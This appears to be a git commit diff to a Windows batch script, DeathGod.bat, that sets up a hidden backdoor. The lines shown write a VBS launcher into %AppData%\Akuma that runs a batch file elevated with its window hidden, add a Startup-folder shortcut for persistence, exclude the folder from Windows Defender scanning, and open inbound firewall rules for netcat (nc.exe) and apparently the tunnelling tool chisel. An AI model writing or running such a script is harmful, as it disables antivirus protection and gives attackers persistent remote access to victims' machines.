0e6dbf9256ee91a2db0279bc1590fbba8ea16bfd
L <112792604+l-urk@users.noreply.github.com>
2023-11-06 16:13:49 -0800

    Update DeathGod.bat

--- DeathGod.bat
+++ DeathGod.bat
@@ -12,7 +12,7 @@ del %AppData%\Akuma\beyondbirthday.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %AppData%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%AppData%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %AppData%\Akuma\beyondbirthday.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
-echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %AppData%\Akuma\beyondbirthday.bat
+echo powershell Add-MpPreference -ExclusionPath "$env:AppData\Akuma" >> %AppData%\Akuma\beyondbirthday.bat
 echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %AppData%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %AppData%\Akuma\beyondbirthday.bat
 echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %AppData%\Akuma\beyondbirthday.bat
